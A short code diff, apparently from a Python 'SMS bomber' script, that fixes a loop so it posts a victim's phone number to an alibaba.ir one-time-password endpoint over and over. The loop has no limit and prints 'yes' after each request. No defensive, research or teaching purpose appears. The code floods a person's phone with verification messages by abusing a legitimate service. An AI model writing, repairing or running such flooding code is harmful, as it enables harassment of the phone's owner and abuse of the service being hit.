@@ -8,6 +8,6 @@ url2 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
 pnd = {'cellphon': f'{phonen}'}
 
 while True:
-      req2 = requests.post(url, json=pnd)
+      req2 = requests.post(url2, json=pnd)
       
       print(colored('yes', 'red'))
